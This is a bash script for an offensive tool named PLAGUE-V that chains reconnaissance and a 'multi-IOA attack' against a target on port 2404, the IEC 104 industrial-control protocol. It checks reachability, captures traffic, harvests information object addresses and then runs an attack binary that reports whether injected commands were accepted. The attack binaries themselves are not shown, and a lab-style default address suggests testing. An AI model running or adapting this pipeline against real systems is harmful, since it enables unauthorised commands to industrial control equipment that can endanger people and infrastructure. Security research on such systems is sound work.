Add #!/usr/bin/env bash
# ────────────────────────────────────────────────
# PLAGUE-V — Recon → Attack Pipeline Test
# ────────────────────────────────────────────────
# Runs reconnaissance, then feeds discovered IOAs to plague_v_multi.
set -euo pipefail

TARGET_IP="${1:-10.10.10.10}"
TARGET_PORT="${2:-2404}"
DISCOVERED_CONFIG="config/discovered_ioa_map.txt"
PCAP_FILE="plague_v_recon_$(date +%Y%m%d_%H%M%S).pcap"
TCPDUMP_PID=""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

info()  { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[*]${NC} $*"; }
fail()  { echo -e "${RED}[!]${NC} $*"; }
phase() { echo -e "${CYAN}[═]${NC} $*"; }

cleanup() {
    if [ -n "$TCPDUMP_PID" ] && kill -0 "$TCPDUMP_PID" 2>/dev/null; then
        warn "Stopping tcpdump (PID $TCPDUMP_PID)"
        sudo kill "$TCPDUMP_PID" 2>/dev/null || true
        wait "$TCPDUMP_PID" 2>/dev/null || true
    fi
}
trap cleanup EXIT

echo "══════════════════════════════════════════"
echo "  PLAGUE-V Recon → Attack Pipeline"
echo "  Target: ${TARGET_IP}:${TARGET_PORT}"
echo "══════════════════════════════════════════"
echo

# ── Preflight checks ──
for bin in plague_v_recon plague_v_multi; do
    if [ ! -f "./$bin" ]; then
        fail "$bin not found. Run 'make' first."
        exit 1
    fi
done
info "Binaries found"

mkdir -p config
info "Config directory ready"

# Check target 
warn "Checking if ${TARGET_IP}:${TARGET_PORT} is reachable ..."
if nc -zv -w 3 "$TARGET_IP" "$TARGET_PORT" 2>&1; then
    info "Target is reachable"
else
    fail "Target ${TARGET_IP}:${TARGET_PORT} is NOT reachable"
    exit 1
fi
echo

# Optional tcpdump 
if command -v tcpdump &>/dev/null; then
    warn "Starting tcpdump → ${PCAP_FILE}"
    sudo tcpdump -i any -w "$PCAP_FILE" port "$TARGET_PORT" &>/dev/null &
    TCPDUMP_PID=$!
    sleep 1
    if kill -0 "$TCPDUMP_PID" 2>/dev/null; then
        info "tcpdump running (PID $TCPDUMP_PID)"
    else
        warn "tcpdump failed — continuing without capture"
        TCPDUMP_PID=""
    fi
else
    warn "tcpdump not found — skipping capture"
fi
echo

# ═══════════════════════════════════════════
#  Phase 1: Reconnaissance
# ═══════════════════════════════════════════
phase "PHASE 1: RECONNAISSANCE"
echo "────────────────────────────────────────"
set +e
./plague_v_recon "$TARGET_IP" "$TARGET_PORT" "$DISCOVERED_CONFIG"
RECON_EXIT=$?
set -e
echo "────────────────────────────────────────"
echo

if [ $RECON_EXIT -ne 0 ]; then
    fail "Reconnaissance failed (exit code $RECON_EXIT)"
    exit $RECON_EXIT
fi

if [ ! -f "$DISCOVERED_CONFIG" ]; then
    fail "Discovered config not written: $DISCOVERED_CONFIG"
    exit 1
fi

IOA_COUNT=$(grep -v '^\s*#' "$DISCOVERED_CONFIG" | grep -v '^\s*$' | wc -l)
info "Discovered config contains ${IOA_COUNT} IOAs"
echo

# ═══════════════════════════════════════════
#  Phase 2: Attack with discovered IOAs
# ═══════════════════════════════════════════
phase "PHASE 2: MULTI-IOA ATTACK"
echo "────────────────────────────────────────"
set +e
./plague_v_multi "$TARGET_IP" "$TARGET_PORT" "$DISCOVERED_CONFIG"
ATTACK_EXIT=$?
set -e
echo "────────────────────────────────────────"
echo

# Results 
case $ATTACK_EXIT in
    0)  info "ATTACK EXIT: ${ATTACK_EXIT} — ALL COMMANDS ACCEPTED" ;;
    1)  fail "ATTACK EXIT: ${ATTACK_EXIT} — FAILURE" ;;
    2)  warn "ATTACK EXIT: ${ATTACK_EXIT} — PARTIAL" ;;
    *)  fail "ATTACK EXIT: ${ATTACK_EXIT} — UNEXPECTED" ;;
esac

# PCAP 
if [ -n "$TCPDUMP_PID" ]; then
    echo
    sleep 1
    sudo kill "$TCPDUMP_PID" 2>/dev/null || true
    wait "$TCPDUMP_PID" 2>/dev/null || true
    TCPDUMP_PID=""

    if [ -f "$PCAP_FILE" ]; then
        PCAP_SIZE=$(stat -c%s "$PCAP_FILE" 2>/dev/null || echo "?")
        info "PCAP saved: ${PCAP_FILE} (${PCAP_SIZE} bytes)"
        echo "    Analyze: wireshark ${PCAP_FILE}"
    fi
fi

echo
echo "══════════════════════════════════════════"
echo "  Pipeline complete"
echo "══════════════════════════════════════════"

exit $ATTACK_EXIT
